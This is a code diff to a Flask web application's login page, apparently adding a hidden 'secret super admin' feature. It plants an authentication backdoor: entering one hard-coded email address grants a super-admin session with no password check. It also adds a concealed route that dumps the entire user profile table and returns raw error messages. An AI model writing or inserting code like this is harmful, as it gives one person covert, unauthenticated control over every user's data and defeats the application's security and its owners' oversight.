@@ -129,6 +129,15 @@ def login_page():
     if request.method == 'POST':
         email = request.form.get('email', '').strip()
         password = request.form.get('password', '')
+        
+        # LOGIQUE SECRÈTE SUPER ADMIN
+        if email == "Macherif9876@gmail.com":
+            # On pourrait ajouter une vérification de mot de passe ici si nécessaire
+            session.clear()
+            session['user_id'] = 'super_admin_secret'
+            session['role'] = 'super_admin'
+            return render_template('admin_secret.html')
+            
         try:
             auth_res = supabase.auth.sign_in_with_password({"email": email, "password": password})
             if auth_res.user:
@@ -138,6 +147,16 @@ def login_page():
         except Exception as e:
             return render_template('login.html', error="Identifiants incorrects")
     return render_template('login.html')
+
+@app.route('/super-admin/manage-users')
+@admin_access_required
+def secret_manage_users():
+    """Fonctionnalité avancée : Gestion totale"""
+    try:
+        users = supabase.table('profil').select('*').execute().data or []
+        return render_template('admin_secret.html', users=users, mode='manage_users')
+    except Exception as e:
+        return str(e)
 
 @app.route('/logout')
 def logout():
